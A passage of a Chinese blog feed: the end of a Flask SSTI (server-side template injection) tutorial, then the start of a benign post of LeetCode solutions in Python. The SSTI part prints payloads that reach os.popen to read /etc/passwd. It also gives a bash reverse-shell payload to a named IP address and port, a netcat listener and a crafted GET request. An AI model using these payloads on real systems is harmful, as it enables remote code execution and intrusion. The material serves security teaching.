class="number">-1</span>].__subclasses__():</span><br><span class="line">count += <span class="number">1</span></span><br><span class="line">  <span class="comment">#在初始化属性中，带wrapper的表示没有重载，因此我们寻找没有带wrapper</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"warpper"</span> <span class="keyword">in</span> repr(i.__init__):</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">      <span class="comment">#__globals__全局方法，查找当前类包含的所有方法和变量及参数</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"os"</span> <span class="keyword">in</span> repr(i.__init__.__globals__):</span><br><span class="line">print(count, i)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>执行结果如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">64</span> &lt;<span class="class"><span class="keyword">class</span> '_<span class="title">frozen_importlib</span>._<span class="title">ModuleLock</span>'&gt;</span></span><br><span class="line"><span class="class">65 &lt;class '_frozen_importlib._DummyModuleLock'&gt;</span></span><br><span class="line"><span class="class">66 &lt;class '_frozen_importlib._ModuleLockManager'&gt;</span></span><br><span class="line"><span class="class">67 &lt;class '_frozen_importlib._installed_safely'&gt;</span></span><br><span class="line"><span class="class">68 &lt;class '_frozen_importlib.ModuleSpec'&gt;</span></span><br><span class="line"><span class="class">79 &lt;class '_frozen_importlib_external.FileLoader'&gt;</span></span><br><span class="line"><span class="class">80 &lt;class '_frozen_importlib_external._NamespacePath'&gt;</span></span><br><span class="line"><span class="class">81 &lt;class '_frozen_importlib_external._NamespaceLoader'&gt;</span></span><br><span class="line"><span class="class">83 &lt;class '_frozen_importlib_external.FileFinder'&gt;</span></span><br><span class="line"><span class="class">117 &lt;class 'os._wrap_close'&gt;</span></span><br><span class="line"><span class="class">147 &lt;class 'reprlib.Repr'&gt;</span></span><br><span class="line"><span class="class">154 &lt;class 'functools.partialmethod'&gt;</span></span><br><span class="line"><span class="class">161 &lt;class 'sre_parse.Pattern'&gt;</span></span><br><span class="line"><span class="class">162 &lt;class 'sre_parse.SubPattern'&gt;</span></span><br><span class="line"><span class="class">163 &lt;class 'sre_parse.Tokenizer'&gt;</span></span><br><span class="line"><span class="class">164 &lt;class 're.Scanner'&gt;</span></span><br></pre></td></tr></table></figure><p>在上述中寻找是否存在文件读取的方法，例如<code>open</code>、<code>popen</code>、<code>file</code>等，最后我们在<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>类中找到了<code>popen</code>函数，从而可以达到任意文件读取的效果。</p><p>payload如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">''.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['popen']('cat /etc/passwd').read()</span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/13.png" alt="13"></p><p>也可以使用Flask框架中的<code>config</code>全局对象来读取任意文件，payload如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()</span><br></pre></td></tr></table></figure><h4 id="SSTI反弹Shell"><a href="#SSTI反弹Shell" class="headerlink" title="SSTI反弹Shell"></a>SSTI反弹Shell</h4><p>因为我们可以调用到os模块，因此可以执行反弹shell，我现在自己的服务器上启动监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elssm@VM-20-13-centos ~&gt; nc -lvvp 9527</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9527</span><br><span class="line">Ncat: Listening on 0.0.0.0:9527</span><br></pre></td></tr></table></figure><p><code>nc</code>命令部分参数介绍</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-h 帮助信息</span><br><span class="line">-i secs 延时的间隔</span><br><span class="line">-l 监听模式，用于入站连接</span><br><span class="line">-L 连接关闭后,仍然继续监听</span><br><span class="line">-n 指定数字的IP地址，不能用hostname</span><br><span class="line">-o file 记录16进制的传输</span><br><span class="line">-p port 本地端口号</span><br><span class="line">-r 随机本地及远程端口</span><br><span class="line">-s addr 本地源地址</span><br><span class="line">-t 使用TELNET交互方式</span><br><span class="line">-u UDP模式</span><br><span class="line">-v 详细输出--用两个-v可得到更详细的内容</span><br><span class="line">-w secs timeout的时间</span><br><span class="line">-z 将输入输出关掉--用于扫描时</span><br></pre></td></tr></table></figure><p>反弹shell的payload如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">''.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['popen']('bash -i &gt;&amp; /dev/tcp/42.193.150.138/9527 0&gt;&amp;1').read()</span><br></pre></td></tr></table></figure><p>但是因为存在<code>&amp;</code>字符，因此在URL解析中会出错，因此我们可以使用Burp构造</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /ssti?code=&#123;&#123;''.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['popen']('bash%20-i%20&gt;%26%20/dev/tcp/42.193.150.138/9527%200&gt;%261').read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/29/SSTI模版注入/14.png" alt="14"></p><p>成功连接</p><p><img src="/2021/11/29/SSTI模版注入/15.png" alt="15"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h4&gt;&lt;p&gt;SSTI(Server-Side Template Injection)漏洞是模版引擎在使用渲染函数的时候，由于代码不规范而导致的代码注入漏
      
    
    </summary>
    
    
      <category term="Web Security" scheme="elssm.github.io/tags/Web-Security/"/>
    
  </entry>
  
  <entry>
    <title>近期Leetcode题解</title>
    <link href="elssm.github.io/2021/11/24/%E8%BF%91%E6%9C%9FLeetcode%E9%A2%98%E8%A7%A3/"/>
    <id>elssm.github.io/2021/11/24/近期Leetcode题解/</id>
    <published>2021-11-24T04:12:45.000Z</published>
    <updated>2021-12-13T09:54:29.253Z</updated>
    
    <content type="html"><![CDATA[<h4 id="剑指-Offer-43-1～n-整数中-1-出现的次数-hard"><a href="#剑指-Offer-43-1～n-整数中-1-出现的次数-hard" class="headerlink" title="剑指 Offer 43. 1～n 整数中 1 出现的次数(hard)"></a>剑指 Offer 43. 1～n 整数中 1 出现的次数(hard)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">countDigitOne</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        对于305295这个数而言</span></span><br><span class="line"><span class="string">        我们假设从百位开始算，百位前面305计为a,百位后面95计为b，百位数等于n%100，100计为base</span></span><br><span class="line"><span class="string">        当百位数大于1的时候</span></span><br><span class="line"><span class="string">            百位数的前半段可以取值为0～305，一共有a+1个数，后半段可以取0～99，一共有base个数</span></span><br><span class="line"><span class="string">            则百位上1能取到的个数是(a+1)*base个数</span></span><br><span class="line"><span class="string">        对于305195这个数而言</span></span><br><span class="line"><span class="string">        当百位数等于1的时候，分两种情况</span></span><br><span class="line"><span class="string">            1.百位数的前半段可以取值为0～304，一共有a个数，后半段可以取0～99，一共有base个数。</span></span><br><span class="line"><span class="string">            2.百位数的前半段可以取值为305，一共有1个数，后半段可以取0～95，一共有b+1个数。</span></span><br><span class="line"><span class="string">            则百位上1能取到的个数是(a*base+1*(b+1))个数</span></span><br><span class="line"><span class="string">        对于305095这个数而言</span></span><br><span class="line"><span class="string">        当百位数小于1的时候</span></span><br><span class="line"><span class="string">            百位数的前半段可以取值为0～304，一共有a个数，后半段可以取0～99，一共有base个数</span></span><br><span class="line"><span class="string">            则百位上1能取到的个数是(a*base)个数</span></span><br><span class="line"><span class="string">        之后while循环分三种情况统计每一位上1的个数即可</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        base = <span class="number">1</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> base &lt;= n:</span><br><span class="line">            b = n % base</span><br><span class="line">            a = n // base</span><br><span class="line">            cur = a % <span class="number">10</span></span><br><span class="line">            a //= <span class="number">10</span></span><br><span class="line">            <span class="keyword">if</span> cur &gt; <span class="number">1</span>:</span><br><span class="line">                res += (a + <span class="number">1</span>) * base</span><br><span class="line">            <span class="keyword">elif</span> cur == <span class="number">1</span>:</span><br><span class="line">                res += (a * base + b + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res += a * base</span><br><span class="line">            base *= <span class="number">10</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-51-数组中的逆序对-hard"><a href="#剑指-Offer-51-数组中的逆序对-hard" class="headerlink" title="剑指 Offer 51. 数组中的逆序对(hard)"></a>剑指 Offer 51. 数组中的逆序对(hard)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reversePairs</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        通过不断地插入值来寻找前面大于当前值的元素个数</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = <span class="number">0</span> <span class="comment">#统计计数</span></span><br><span class="line">        sorted_nums = [] <span class="comment">#准备一个待插入的列表</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            <span class="comment">#找到nums中当前数在sorted_nums中要插入的下标</span></span><br><span class="line">            k = bisect.bisect(sorted_nums, nums[i]) </span><br><span class="line">            <span class="comment">#当前下标减去要插入的下标就是在大于当前数的个数</span></span><br><span class="line">            res += i - k</span><br><span class="line">            sorted_nums[k:k] = [nums[i]] <span class="comment">#插入当前元素</span></span><br><span class="line">            <span class="comment"># bisect.insort(sorted_nums,nums[i]) #插入当前元素</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-60-n个骰子的点数-medium"><a href="#剑指-Offer-60-n个骰子的点数-medium" class="headerlink" title="剑指 Offer 60. n个骰子的点数(medium)"></a>剑指 Offer 60. n个骰子的点数(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#import numpy as np</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dicesProbability</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: List[float]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#卷积做法</span></span><br><span class="line">        <span class="comment"># conv1 = [1.0/6 for i in range(6)]</span></span><br><span class="line">        <span class="comment"># if n==1:</span></span><br><span class="line">        <span class="comment">#     return conv1</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     convN = self.dicesProbability(n-1)</span></span><br><span class="line">        <span class="comment">#     return np.convolve(convN,conv1)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#动态规划</span></span><br><span class="line">        dp = [<span class="number">1.0</span>/<span class="number">6</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">6</span>)] <span class="comment">#骰子数为1时候的值</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n+<span class="number">1</span>):</span><br><span class="line">            <span class="comment">#tmp长度为n个骰子能取到的值的个数，全部初始化为0</span></span><br><span class="line">            tmp = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(i*<span class="number">5</span>+<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(dp)): <span class="comment">#n-1个骰子取到的所有值</span></span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">6</span>): <span class="comment">#加上第n个骰子取得的值</span></span><br><span class="line">                    tmp[j+k] += dp[j]/<span class="number">6.0</span> <span class="comment">#之前的值和当前的值叠加</span></span><br><span class="line">            dp = tmp <span class="comment">#得到最新的值赋值给dp</span></span><br><span class="line">        <span class="keyword">return</span> dp</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-12-矩阵中的路径-medium"><a href="#剑指-Offer-12-矩阵中的路径-medium" class="headerlink" title="剑指 Offer 12. 矩阵中的路径(medium)"></a>剑指 Offer 12. 矩阵中的路径(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exist</span><span class="params">(self, board, word)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type board: List[List[str]]</span></span><br><span class="line"><span class="string">        :type word: str</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(board,i,j,word,k)</span>:</span></span><br><span class="line">            <span class="comment">#判断下标是否越界</span></span><br><span class="line">            <span class="keyword">if</span> i&lt;<span class="number">0</span> <span class="keyword">or</span> i == len(board) <span class="keyword">or</span> j &lt; <span class="number">0</span> <span class="keyword">or</span> j == len(board[<span class="number">0</span>]):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="comment">#如果当前值和word当前值不相等，直接返回</span></span><br><span class="line">            <span class="keyword">if</span> board[i][j] != word[k]:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="comment">#如果访问到了word最后一个值，返回True</span></span><br><span class="line">            <span class="keyword">if</span> k == len(word)<span class="number">-1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="comment">#先将当前值置空，防止后面重复访问</span></span><br><span class="line">            board[i][j] = <span class="string">''</span></span><br><span class="line">            res = dfs(board, i<span class="number">-1</span>, j, word, k+<span class="number">1</span>) <span class="keyword">or</span> dfs(board, i, j<span class="number">-1</span>, word, k+<span class="number">1</span>) \</span><br><span class="line">            <span class="keyword">or</span> dfs(board, i+<span class="number">1</span>, j, word, k+<span class="number">1</span>) <span class="keyword">or</span> dfs(board, i, j+<span class="number">1</span>, word, k+<span class="number">1</span>)</span><br><span class="line">            board[i][j] = word[k]</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(board)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(board[i])):</span><br><span class="line">                <span class="keyword">if</span> dfs(board,i,j,word,<span class="number">0</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-41-数据流中的中位数-hard"><a href="#剑指-Offer-41-数据流中的中位数-hard" class="headerlink" title="剑指 Offer 41. 数据流中的中位数(hard)"></a>剑指 Offer 41. 数据流中的中位数(hard)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> heapq <span class="keyword">import</span> *</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MedianFinder</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 菜鸡的数组排序做法</span></span><br><span class="line">    <span class="comment"># def __init__(self):</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     initialize your data structure here.</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     self.res=[]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># def addNum(self, num):</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     :type num: int</span></span><br><span class="line">    <span class="comment">#     :rtype: None</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     self.res.append(num)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># def findMedian(self):</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     :rtype: float</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     self.res=sorted(self.res)</span></span><br><span class="line">    <span class="comment">#     if len(self.res)%2:</span></span><br><span class="line">    <span class="comment">#         return self.res[len(self.res)/2]</span></span><br><span class="line">    <span class="comment">#     else:</span></span><br><span class="line">    <span class="comment">#         return (self.res[len(self.res)/2-1]+self.res[len(self.res)/2])/2.0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#大佬的堆解法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment">#heapq默认小顶堆</span></span><br><span class="line">        self.A = [] <span class="comment"># 小顶堆，保存较大的一半</span></span><br><span class="line">        <span class="comment">#实现大顶堆进堆的时候取相反数</span></span><br><span class="line">        self.B = [] <span class="comment"># 大顶堆，保存较小的一半</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addNum</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="comment"># 如果不相等，说明A多了一个</span></span><br><span class="line">        <span class="comment"># 把当前数存到A，调整堆之后，返回A中的最小值给B</span></span><br><span class="line">        <span class="keyword">if</span> len(self.A) != len(self.B):</span><br><span class="line">            heappush(self.B, -heappushpop(self.A, num))</span><br><span class="line">        <span class="comment"># 如果相等，就把当前数给B，调整堆之后，返回B中的最大值给A</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            heappush(self.A, -heappushpop(self.B, -num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findMedian</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 如果是奇数，直接返回A中的最小值</span></span><br><span class="line">        <span class="comment"># 如果是偶数，则返回两者堆顶的平均值</span></span><br><span class="line">        <span class="comment"># print(self.A)</span></span><br><span class="line">        <span class="comment"># print(self.B)</span></span><br><span class="line">        <span class="keyword">return</span> self.A[<span class="number">0</span>] <span class="keyword">if</span> len(self.A) != len(self.B) <span class="keyword">else</span> (self.A[<span class="number">0</span>] - self.B[<span class="number">0</span>]) / <span class="number">2.0</span></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="comment"># Your MedianFinder object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = MedianFinder()</span></span><br><span class="line"><span class="comment"># obj.addNum(num)</span></span><br><span class="line"><span class="comment"># param_2 = obj.findMedian()</span></span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-13-机器人的运动范围-medium"><a href="#剑指-Offer-13-机器人的运动范围-medium" class="headerlink" title="剑指 Offer 13. 机器人的运动范围(medium)"></a>剑指 Offer 13. 机器人的运动范围(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">movingCount</span><span class="params">(self, m, n, k)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type m: int</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(i,j,k)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span>&lt;= i &lt;m <span class="keyword">or</span> <span class="keyword">not</span> <span class="number">0</span>&lt;= j &lt;n <span class="keyword">or</span> (i,j) <span class="keyword">in</span> a <span class="keyword">or</span> (i%<span class="number">10</span>+i//<span class="number">10</span>+j%<span class="number">10</span>+j//<span class="number">10</span>)&gt;k: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="comment">#把这个点加入到访问集合中</span></span><br><span class="line">            a.add((i,j))</span><br><span class="line">            <span class="comment">#因为从（0,0）开始，所以只要向下走或向右走就行</span></span><br><span class="line">            dfs(i+<span class="number">1</span>,j,k)</span><br><span class="line">            dfs(i,j+<span class="number">1</span>,k) </span><br><span class="line">        a = set()</span><br><span class="line">        dfs(<span class="number">0</span>,<span class="number">0</span>,k)</span><br><span class="line">        <span class="keyword">return</span> len(a)</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-44-数字序列中某一位的数字-medium"><a href="#剑指-Offer-44-数字序列中某一位的数字-medium" class="headerlink" title="剑指 Offer 44. 数字序列中某一位的数字(medium)"></a>剑指 Offer 44. 数字序列中某一位的数字(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findNthDigit</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        num = <span class="number">0</span></span><br><span class="line">        temp=<span class="number">0</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        如果n大于9的话，判断n应该在哪个区间</span></span><br><span class="line"><span class="string">        因为1位数一共有9个</span></span><br><span class="line"><span class="string">        2位数有90*2=180个</span></span><br><span class="line"><span class="string">        3位数有900*3=2700个</span></span><br><span class="line"><span class="string">        因此我们可以知道n位数有9*(10**(i-1)*i)个</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">while</span> n&gt;num:</span><br><span class="line">            temp = num <span class="comment">#temp保存上一个num的数</span></span><br><span class="line">            addnum = <span class="number">9</span>*(<span class="number">10</span>**i)*(i+<span class="number">1</span>)</span><br><span class="line">            num+=addnum</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">        res = n-temp <span 